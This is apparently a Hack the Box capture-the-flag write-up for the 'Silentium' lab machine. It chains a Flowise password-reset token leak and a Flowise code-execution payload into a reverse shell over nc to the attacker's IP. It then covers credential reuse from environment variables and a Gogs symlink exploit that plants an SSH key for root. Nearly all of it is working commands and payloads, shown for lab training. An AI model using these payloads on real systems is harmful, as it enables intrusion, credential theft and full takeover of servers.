---
source: Hack the Box
title: Silentium
difficulty: easy
tags: Flowise AI, Gogs, CVE Chaining
summary: A vulnerable Flowise instance allows an attacker to takeover user accounts. This leads to arbitrary remote code execution. Once an attacker has access to the machine, they are able to exploit a vulnerable gogs instance running as root, compromising the machine with root privileges.
---

## [01] Port Scan and Service Discovery

```term
$ sudo nmap -p- -sC -sV -vv -oN scans/nmap_all_tcp.txt 10.129.84.84

PORT   STATE SERVICE REASON         VERSION
??22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
??80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
!!|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```
> We got a domain name, "silentium.htb" that we will add to our /etc/hosts file.

## [02] Enumerating HTTP, Account Takeover via Flowise

Using `ffuf` we can scan for any virtual hosts on the webserver.

```term
$ ffuf -w /usr/share/wordlists/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -ac -c

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

!!staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 63ms]
:: Progress: [100000/100000] :: Job [1/1] :: 1047 req/sec :: Duration: [0:01:39] :: Errors: 0 ::
```

We get a hit on `staging`. Let's now update our /etc/hosts file to include `staging.silentium.htb`.

Inspecting the main site doesn't show anything too interesting, just a financial firm trying to take our money. However, towards the bottom we get insight on to employees at this firm. These are potential users and worth nothing.

Navigating to "staging.silentium.htb" shows `Flowise AI`. Manually inspecting the site we can find a password reset function. There is a article from last year on account takeover in Flowise via password reset token vulnerability.
> https://cybersecuritynews.com/flowiseai-password-reset-token-vulnerability/
It gives us a simple proof of concept as well:
```term
curl -i -X POST https://<target>/api/v1/account/forgot-password -H “Content-Type: application/json” -d ‘{“user”:{“email”:”victim@example.com”}}’.
```

Remembering from the main site, we have three users we can test this against. Since we only have three users, we can easily send these requests manually.

We get a couple 404 for "User not found", but when testing Ben's account we get the following:

```term
$ curl -i -X POST 'http://staging.silentium.htb/api/v1/account/forgot-password' -H "Content-Type: application/json" -d '{"user":{"email":"ben@silentium.htb"}}'
HTTP/1.1 201 Created
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 12 Sep 2026 10:49:41 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 579
Connection: keep-alive
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"243-bCccjENELfqLXK8PtpOgKPbIgv0"

!!{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"LIOaorBTqYV2o70ajE1l4m5IXhqbJrltvd6Navp6nI5zTbJWV6Wg5yax9nHuPLuM","tokenExpiry":"2026-09-12T11:04:41.665Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-09-12T10:49:41.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```

We can now use the tempToken to reset Ben's password and login to the Flowise instance.

## [03] Exploiting FlowiseAI

Now that we are authenticated, we can find the version of the Flowise instance as version `3.0.5`. Searching for vulnerabilities on this leads us to the following article:
> https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p

All we need is an API key which will lead us to remote code execution. Back on Flowise, there is a tab for "API Keys" that gives us just what we need. Putting the github advisory and our API key together gives us the following payload:

```term
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"ping -c 1 10.10.15.147\");return 1;})()})"
    }
  }'
```

Let's start `tcpdump`, run our curl command, and see if we get a ping.

```term
$ sudo tcpdump -i tun0 icmp

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
!!09:32:09.376065 IP silentium.htb > maliwan: ICMP echo request, id 3581, seq 0, length 64
09:32:09.376088 IP maliwan > silentium.htb: ICMP echo reply, id 3581, seq 0, length 64
``` 

We have confirmed we have code execution on the server. We can now weaponize this to get a remote connection to the machine. Let's change the payload to send us a bash reverse shell.
```term
??({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.15.147 9001 >/tmp/f\");return 1;})()})
```

We get an error back saying `/bin/sh: bash: not found`, so we need to change the payload to invoke sh, not bash.

```term
??({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.147 9001 >/tmp/f\");return 1;})()})
```

And we successfully have a reverse connection to the machine.

```term
$ nc -lvnp 9001

listening on [any] 9001 ...
??connect to [10.10.15.147] from (UNKNOWN) [10.129.84.84] 45971
sh: can't access tty; job control turned off
??/ # whoami
!!root
```

## [04] Enumerating the Docker Container

Checking environment variables shows some interesing information.

```term
$ env

!!FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=4
PORT=3000
HOME=/root
OLDPWD=/home/node
!!SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
PS1=#
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
!!SMTP_PASSWORD=xxxxxxxx
NVIDIA_NIM_LLM_MODE=managed
!!SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

Most notibly, we see Ben pop up again and a SMTP password. SMTP is the Simple Mail Transfer Protocol, which ties to the SENDER_EMAIL variable, we can check for ssh access with these credentials as well.

```term
$ nxc ssh silentium.htb -u ben -p 'xxxxxxxx'

SSH         10.129.84.84    22     silentium.htb    [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.15
!!SSH         10.129.84.84    22     silentium.htb    [+] ben:xxxxxxxx  Linux - Shell access!
``` 

## [05] Shell as ben, Exploiting gogs

Checking for any services running on the host shows the following:

```term
$ ben@silentium:/opt/gogs$ netstat -tlnp

(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
!!tcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
!!tcp        0      0 127.0.0.1:8025          0.0.0.0:*               LISTEN      -
!!tcp        0      0 127.0.0.1:41663         0.0.0.0:*               LISTEN      -
!!tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
!!tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

We can forward these ports back to us via ssh tunneling so we can access them from our local machine.
```term
ssh -L 1025:127.0.0.1:1025 \
-L 8025:127.0.0.1:8025 \
-L 41663:127.0.0.1:41663 \
-L 3000:127.0.0.1:3000 \
-L 3001:127.0.0.1:3001 \
ben@silentium.htb
```

Checking running processes we can see root is running a `gogs` instance.
```term
!!root        1485  0.0  1.9 1738540 78492 ?       Ssl  09:48   0:03 /opt/gogs/gogs/gogs web
```

Playing with the application we can find the version information for gogs.

```term
$ ben@silentium:/opt/gogs/gogs$ ./gogs -h

NAME:
   Gogs - A painless self-hosted Git service

USAGE:
   gogs [global options] command [command options] [arguments...]

VERSION:
!!   0.13.3
```

We can also find a github adivsory here, showcasing a symlink traversal:
> https://github.com/gogs/gogs/pull/8078

This looks like our way in.

Looking through the advisory, it looks like we need a few things. We need to:

- Create a new user.
- Create a new repo.
- Generate a token.
- Create an arbitrary symlink file.
- Clone the repo.
- Push the file.
- Use the gog api to proc the exploit.

Let's begin doing that, which can easily be done through the web instance we forwarded back on port 3001. Once we have a user we need to generate a token.
> The token can be generated through Your Settings > Applications > Generate New Token

Once we have that, we can start essentially filling in the blanks from the github example poc.
> Note: The payload data is base64 encoded in the json data, this is an important step.

The example I give will create an entry in `authorized_keys` for the root user, however, you can create a sudoers entry as well, etc.

```term
$ ssh-keygen -t ed25519 -f kttk -N "" -q
```
> Generating ssh keys on attacker machine.

Now back on the ben shell, export our token, and payload.

```term
??ben@silentium:~$ export TOKEN="07186290be54b7b77b03d39f7038d4ac6e4cb84b"
??ben@silentium:~$ export PAYLOAD="$(echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAO8dzxZCswcbpIBK3HxnAIu9E7G23LqF9i2KNQaYHuE grehaus@maliwan' | base64 -w0)"
??ben@silentium:~$ echo $PAYLOAD
c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUFPOGR6eFpDc3djYnBJQkszSHhuQUl1OUU3RzIzTHFGOWkyS05RYVlIdUUgZ3JlaGF1c0BtYWxpd2FuCg==
```
> Note: This is the public key from our key pair that we will eventually use in the symlink. 

Now configure git.

```term
??ben@silentium:~$ git clone http://127.0.0.1:3001/jen/code                                                                                                                                                                                                                     16:18 [1/1]
Cloning into 'code'...                                                                                                                                                                                                                                                                   
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (3/3), 220 bytes | 110.00 KiB/s, done.

??ben@silentium:~$ cd code

??ben@silentium:~/code$ git config --global user.name "jen"

??ben@silentium:~/code$ git config --global user.email "jen@silentium.htb"

??ben@silentium:~/code$ ln -s /root/.ssh/authorized_keys update.txt

??ben@silentium:~/code$ git add update.txt

??ben@silentium:~/code$ git commit -m "Updates to consider"
[master 6731dc4] Updates to consider
 1 file changed, 1 insertion(+)
 create mode 120000 update.txt

??ben@silentium:~/code$ git push
```

Now use the curl example and adapt it to our needs.

```term
$ ben@silentium:~/code$ curl -X PUT "http://127.0.0.1:3001/api/v1/repos/jen/code/contents/update.txt" -H "Authorization: token $TOKEN" -H "Content-Type: application/json" -d "{\"message\":\"updates\",\"content\":\"$PAYLOAD\"}" -v | jq

* Connected to 127.0.0.1 (127.0.0.1) port 3001
> PUT /api/v1/repos/jen/code/contents/update.txt HTTP/1.1
> Host: 127.0.0.1:3001
> User-Agent: curl/8.5.0
> Accept: */*
> Authorization: token 07186290be54b7b77b03d39f7038d4ac6e4cb84b
> Content-Type: application/json
> Content-Length: 166
>
} [166 bytes data]
!!< HTTP/1.1 201 Created
< Content-Type: application/json; charset=UTF-8
< Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
< Set-Cookie: i_like_gogs=b6c21e8228eb9e07; Path=/; HttpOnly
< Set-Cookie: _csrf=6Yr7kY08gt5weGA6tFErajD4g106MTc4OTIzODM2NDIwNDE0NDA1Mg; Path=/; Domain=staging-v2-code.dev.silentium.htb; Expires=Sun, 13 Sep 2026 18:39:24 GMT; HttpOnly
< X-Content-Type-Options: nosniff
< X-Frame-Options: deny
< Date: Sat, 12 Sep 2026 18:39:24 GMT
< Content-Length: 1987
<
{ [1987 bytes data]
100  2153  100  1987  100   166  10312    861 --:--:-- --:--:-- --:--:-- 11213
* Connection #0 to host 127.0.0.1 left intact
---snip---
  "content": {
    "type": "symlink",
!!    "target": "/root/.ssh/authorized_keys",
---snip---
```

We get a 201 response and double check the correct target path. We can now attempt to ssh with our private key.

```term
$ ssh -i kttk root@silentium.htb

??root@silentium:~# whoami
!!root
```
